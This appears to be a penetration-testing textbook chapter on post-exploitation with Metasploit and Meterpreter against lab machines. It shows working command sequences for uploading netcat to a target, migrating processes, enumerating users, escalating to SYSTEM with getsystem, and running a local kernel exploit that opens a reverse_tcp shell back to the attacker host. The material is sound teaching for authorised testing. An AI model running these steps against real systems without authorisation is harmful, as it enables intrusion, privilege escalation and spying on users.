### Post-Exploitation: Enhancing the Penetration Test

Effective post-exploitation is crucial for a comprehensive penetration test. Without thorough post-exploitation, the client may not fully understand their vulnerabilities, especially in areas like password policies. This chapter will cover the fundamentals of post-exploitation, which is essential for any aspiring penetration tester. Mastery of these skills distinguishes good pentesters from the truly great ones.

### Metasploit and Meterpreter

In this section, we will explore some of the post-exploitation options available in Metasploit, with a focus on Meterpreter, Metasploit’s custom payload.

#### Opening Meterpreter Sessions

To begin, let's open a Meterpreter session on each of our target systems. The following listing shows the active sessions on our targets:

```plaintext
msf > sessions -l
Active sessions
===============
Id  Type              Information                         Connection
--  ----              -----------                         ----------
1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ BOOKXP  192.168.20.9:4444 -> 192.168.20.10:1104 (192.168.20.10)
2   meterpreter x86/win32  Book-Win7\Georgia Weidman @ Book-Win7 192.168.20.9:2345 -> 192.168.20.12:49264 (192.168.20.12)
3   meterpreter php/php    www-data (33) @ ubuntu          192.168.20.9:4444 -> 192.168.20.11:48308 (192.168.20.11)
```

**Listing 13-1: Open Metasploit sessions on our targets**

Start by interacting with your Windows XP session:

```plaintext
msf post(enum_logged_on_users) > sessions -i 1
```

#### Meterpreter Commands

We have already encountered several Meterpreter commands in previous chapters. For example, in Chapter 9, we used `hashdump` to extract local password hashes. To see a list of available Meterpreter commands, type `help` in the Meterpreter console. For more details about a specific command, use `command -h`.

#### Using the `upload` Command

One common challenge during a pentest is the lack of utilities like `wget` and `curl` on Windows machines. Meterpreter simplifies this with the `upload` command. Here’s how to use it:

```plaintext
meterpreter > help upload
Usage: upload [options] src1 src2 src3 ... destination
Uploads local files and directories to the remote machine.
OPTIONS:
  -h Help banner.
  -r Upload recursively.
```

**Listing 13-2: Meterpreter `upload` command help**

For example, to upload Netcat for Windows:

```plaintext
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\
[*] uploading : /usr/share/windows-binaries/nc.exe -> C:\
[*] uploaded : /usr/share/windows-binaries/nc.exe -> C:\\nc.exe
```

**Note:** Remember to escape backslashes in the path with a second backslash. Also, record any changes made to the target system so you can revert them before the engagement ends.

#### `getuid` Command

The `getuid` command is useful for determining the user context in which Meterpreter is running. For example, after exploiting an SMB server with the MS08-067 exploit, we run as the System account:

```plaintext
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

On the Windows 7 target, we might be running as the user Georgia Weidman:

```plaintext
meterpreter > getuid
Server username: Book-Win7\Georgia Weidman
```

#### Additional Meterpreter Commands

Explore other Meterpreter commands for local information gathering, remote control, and spying on local users, such as keylogging and webcam access.

#### Meterpreter Scripts

Meterpreter also supports scripts written in Ruby. These scripts can be found in `/usr/share/metasploit-framework/scripts/meterpreter`. To use a script, enter `run <script>`. For example, the `migrate` script can be used to move the Meterpreter session to a different process:

```plaintext
meterpreter > run migrate -h
OPTIONS:
  -f Launch a process and migrate into the new process
  -h Help menu.
  -k Kill original process.
  -n Migrate into the first process with this executable name (e.g., explorer.exe)
  -p PID to migrate to.
```

**Listing 13-3: Migrate script help information**

To migrate to a process by name or PID:

```plaintext
meterpreter > ps
Process List
============
PID  PPID  Name         Arch  Session  User           Path
---  ----  ----         ----  -------  ----           ----
0    0     [System Process]
4    0     System       x86   0        NT AUTHORITY\SYSTEM
...
1144 1712  explorer.exe  x86   0        BOOKXP\georgia C:\WINDOWS\Explorer.EXE
...

meterpreter > run migrate -p 1144
[*] Migrating from 1100 to 1144...
[*] Migration completed successfully.
meterpreter > getuid
Server username: BOOKXP\georgia
```

**Listing 13-5: Running the `migrate` script**

#### Metasploit Post-Exploitation Modules

Metasploit includes a variety of post-exploitation modules for local information gathering, remote control, and privilege escalation. For example, the `post/windows/gather/enum_logged_on_users` module lists currently logged-on users:

```plaintext
msf > use post/windows/gather/enum_logged_on_users
msf post(enum_logged_on_users) > show options
Module options (post/windows/gather/enum_logged_on_users):
Name            Current Setting  Required  Description
----            ---------------  --------  -----------
CURRENT         true             yes       Enumerate currently logged on users
RECENT          true             yes       Enumerate recently logged on users
SESSION         yes              The session to run this module on.

msf post(enum_logged_on_users) > set SESSION 1
SESSION => 1
msf post(enum_logged_on_users) > exploit
[*] Running against session 1
Current Logged Users
====================
SID                User
---                ----
S-1-5-21-299502267-308236825-682003330-1003  BOOKXP\georgia
...
```

**Listing 13-6: Running a Metasploit post module**

#### Railgun

Railgun is an extension for Meterpreter that provides direct access to Windows APIs. It can be used within post-exploitation modules and the Ruby shell (irb). For example, to check if the session is running as an administrative user:

```plaintext
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>> client.railgun.shell32.IsUserAnAdmin
=> {"GetLastError"=>0, "Error Message"=>"The operation completed successfully.", "return"=>true}
```

**Note:** Use `exit` to return to the Meterpreter console.

#### Local Privilege Escalation

Local privilege escalation involves running exploits to gain additional control of the system after initial exploitation. Some attacks may result in limited user privileges, requiring further exploitation to gain higher privileges.

##### `getsystem` on Windows

The `getsystem` command automates the process of trying known local privilege-escalation exploits:

```plaintext
meterpreter > getsystem -h
Usage: getsystem [options]
Attempt to elevate your privilege to that of local system.
OPTIONS:
  -h Help Banner.
  -t The technique to use. (Default to '0').
    0 : All techniques available
    1 : Service - Named Pipe Impersonation (In Memory/Admin)
    2 : Service - Named Pipe Impersonation (Dropper/Admin)
    3 : Service - Token Duplication (In Memory/Admin)
```

**Listing 13-7: `getsystem` help**

Running `getsystem` with no arguments will try all available techniques:

```plaintext
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

##### Local Exploitation Module for Windows

Metasploit also includes local exploit modules. For example, the `exploit/windows/local/ms11_080_afdjoinleaf` module exploits a flaw in the `afd.sys` driver:

```plaintext
msf post(enum_logged_on_users) > use exploit/windows/local/ms11_080_afdjoinleaf
msf exploit(ms11_080_afdjoinleaf) > show options
Module options (exploit/windows/local/ms11_080_afdjoinleaf):
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
SESSION   yes              The session to run this module on.

msf exploit(ms11_080_afdjoinleaf) > set SESSION 1
SESSION => 1
msf exploit(ms11_080_afdjoinleaf) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms11_080_afdjoinleaf) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(ms11_080_afdjoinleaf) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Running against Windows XP SP2 / SP3
```

This completes our overview of post-exploitation using Metasploit and Meterpreter. By mastering these techniques, you can provide a more comprehensive and effective penetration test.